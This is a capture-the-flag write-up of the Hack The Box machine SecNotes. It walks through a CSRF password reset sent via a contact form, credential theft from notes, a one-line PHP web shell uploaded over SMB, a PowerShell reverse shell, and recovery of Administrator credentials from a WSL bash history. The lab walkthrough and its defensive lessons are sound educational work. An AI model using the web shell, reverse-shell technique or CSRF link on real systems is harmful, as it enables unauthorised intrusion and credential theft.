# HTB Write-up: SecNotes

**Difficulty:** Medium
**OS:** Windows
**Target IP:** 10.129.56.104
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning
Started with a fast port sweep using `rustscan`, followed by a detailed service scan with `nmap`.

```bash
rustscan -a 10.129.56.104
```

Result: three ports open.

```
Open 10.129.56.104:80
Open 10.129.56.104:445
Open 10.129.56.104:8808
```

```bash
nmap -sCV -T4 10.129.56.104 -p80,445,8808 -oA nmap/nmap
```

```
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-title: IIS Windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   Computer name: SECNOTES
|_  Workgroup: HTB
```

Key takeaways:
- A "Secure Notes" web app on port 80 (`login.php`).
- SMB open on 445, `message signing disabled` — worth revisiting once credentials are found.
- A second, unauthenticated IIS instance on port 8808 with a generic default page — likely tied to the SMB share once creds are obtained.

---

## 2. Web Application — Account Takeover

### 2.1 Registering an Account

No default credentials worked against the login page, so I registered a new account directly.

Once logged in, `http://10.129.56.104/home.php` presented **New Note**, **Change Password**, **Sign Out**, and **Contact Us** options, along with a banner:

> Due to GDPR, all users must delete any notes that contain Personally Identifiable Information (PII). Please contact tyler@secnotes.htb using the contact link below with any questions.

This disclosed a valid internal username/contact: **tyler**.

### 2.2 Password Reset via CSRF (GET-based change password)

The **Change Password** function had no protections at all:
- No requirement to supply the *current* password.
- The request was submitted as a simple `GET` request (captured and confirmed via Burp Suite), meaning the entire password-change action could be encoded into a single URL.

```
GET /change_pass.php?password=password&confirm_password=password&submit=submit HTTP/1.1
Host: 10.129.56.104
...
Cookie: PHPSESSID=fodf05130s9kurd6panr564b3a
```

This is a classic **CSRF-able password reset**: since the request needs no proof of the current password and is entirely state-changing via `GET`, any authenticated user (including `tyler`, if he clicks a link while logged in) can have their password silently overwritten.

### 2.3 Exploiting via the Contact Form

Used the **Contact Us** feature (which emails `tyler@secnotes.htb`) to deliver the malicious link in the message body:

```
http://10.129.56.104/change_pass.php?password=password&confirm_password=password&submit=submit
```

The assumption is that this message is processed/opened by an internal user or automated agent authenticated as `tyler` (a common pattern on these "contact us → admin reviews it" boxes), which triggers the password change while their session cookie is active.

Result: **tyler's password was reset to `password`**, giving direct account takeover.

### 2.4 Credential Harvesting from Notes

Logged in as `tyler:password` and reviewed his saved notes. One note contained a second, higher-value credential set tied to an internal SMB share:

```
New Site:
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

---

## 3. Exploitation — Foothold

### 3.1 Enumerating the SMB Share

```bash
smbclient //10.129.56.104/new-site -U tyler
```

Confirmed access with the harvested password, and used `smbmap` to check exact permissions:

```bash
smbmap -H 10.129.56.104 -u tyler -p '92g!mA8BGjOirkL%OG*&' -s new-site
```

```
Disk                 Permissions     Comment
----                 -----------     -------
ADMIN$               NO ACCESS       Remote Admin
C$                    NO ACCESS       Default share
IPC$                 READ ONLY       Remote IPC
new-site             READ, WRITE
```

`tyler` has **read/write** access to the `new-site` share — and given the earlier IIS instance on port 8808, this share is very likely the webroot being served there.

### 3.2 Uploading a Web Shell

Created a minimal PHP web shell:

```php
<?php system($_GET['cmd']); ?>
```

Uploaded it directly over SMB:

```bash
smbclient //10.129.56.104/new-site -U tyler
smb: \> put shell.php
```

Confirmed code execution by hitting it over HTTP:

```
http://10.129.56.104:8808/shell.php?cmd=whoami
```

```
secnotes\tyler
```

### 3.3 Reverse Shell

Generated a Base64-encoded PowerShell TCP reverse-shell payload and passed it through the web shell's `cmd` parameter (URL-encoded) to call back to a listener:

```
http://10.129.56.104:8808/shell.php?cmd=powershell%20-e%20<base64-encoded-payload>
```

Caught the callback:

```bash
nc -lvnp 4444
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.56.104] 55052
whoami
secnotes\tyler
PS C:\inetpub\new-site>
```

✅ Foothold obtained as `secnotes\tyler`.

---

## 4. Privilege Escalation

### 4.1 Discovering WSL on the Host

While enumerating `C:\`, an unusual artifact stood out:

```
PS C:\> dir

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/21/2018   3:07 PM                Distros
...
-a----        6/21/2018   3:07 PM      201749452 Ubuntu.zip
```

An `Ubuntu.zip` and a `Distros` folder suggested the **Windows Subsystem for Linux (WSL)** was installed. Confirmed via the registry:

```powershell
Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss | %{Get-ItemProperty $_.PSPath} | out-string -width 4096
```

```
DistributionName  : Ubuntu-18.04
BasePath          : C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState
```

WSL distributions store their entire Linux filesystem (including root's home directory and shell history) inside this `LocalState\rootfs` path — fully readable from the Windows side without ever needing to launch WSL itself.

### 4.2 Reading Root's Bash History Inside the WSL Filesystem

Navigated into the WSL root filesystem and inspected the Linux root user's shell history:

```powershell
cd C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root
type .bash_history
```

```
cd /mnt/c/
...
mount //127.0.0.1/c$ filesystem/ -o user=administrator
sudo apt install cifs-utils
...
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
```

The history captured the **plaintext Administrator SMB credentials** used when the box's previous operator mounted the `C$` share from inside WSL: `administrator:u6!4ZwgwOM#^OBf#Nwnh`.

### 4.3 Authenticating as Administrator

Replayed the exact command from the recovered history against the target directly:

```bash
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.129.56.104\\c$
```

```
smb: \> cd Users
smb: \Users\> cd Administrator
smb: \Users\Administrator\> cd Desktop
smb: \Users\Administrator\Desktop\> ls
  root.txt                           AR       34  Thu Aug  6 06:53:25 2026
```

✅ Administrator access confirmed, and root flag located.

---

## 5. Summary

| Stage | Technique |
|-------|-----------|
| Recon | `rustscan` + `nmap` → IIS login portal (80), SMB (445), secondary unauthenticated IIS instance (8808) |
| Account access | Self-registered account revealed `tyler@secnotes.htb`; CSRF-able GET-based password change reset **tyler**'s password via the Contact Us form |
| Credential harvesting | Tyler's saved notes exposed SMB credentials for a `new-site` share |
| Foothold | Read/write SMB access → uploaded PHP web shell served by IIS on 8808 → PowerShell reverse shell as `secnotes\tyler` |
| Privilege Escalation | Discovered WSL (Ubuntu 18.04) installed under tyler's profile; read root's `.bash_history` inside the WSL rootfs, which leaked plaintext Administrator SMB credentials used for a prior `C$` mount |
| Result | Authenticated as Administrator over SMB, retrieved `root.txt` |

**Root cause / lessons learned:**
- Password-change functionality must require the current password and must never be a state-changing `GET` request — this combination made the flow trivially exploitable via CSRF through the site's own Contact Us feature.
- Credentials should never be stored in plaintext inside application notes/messages, regardless of "for internal use" assumptions.
- WSL distributions store their entire Linux filesystem, including shell history, unencrypted on the Windows NTFS volume — meaning secrets typed inside WSL (or commands run there, like `mount ... -o user=administrator`) are recoverable by anyone with Windows-side file access to that user's profile. Sensitive credential use inside WSL should be treated with the same care as on the Windows host itself, and shell history should be cleared or excluded from persistence where possible.
- Reused/shared local Administrator credentials across authentication contexts (interactive login, SMB mounts, etc.) meant a single leaked value led directly to full domain-equivalent local compromise.

---

## 6. Tools Used

- `rustscan`, `nmap` — reconnaissance
- Burp Suite — intercepting/replaying the password-change request
- `smbclient`, `smbmap` — SMB enumeration and file upload
- Custom PHP web shell — initial code execution
- PowerShell reverse shell (Base64-encoded `-e` payload) — interactive foothold
- Windows Registry (`Lxss` key) — WSL distribution discovery
- Netcat (`nc`) — shell handling
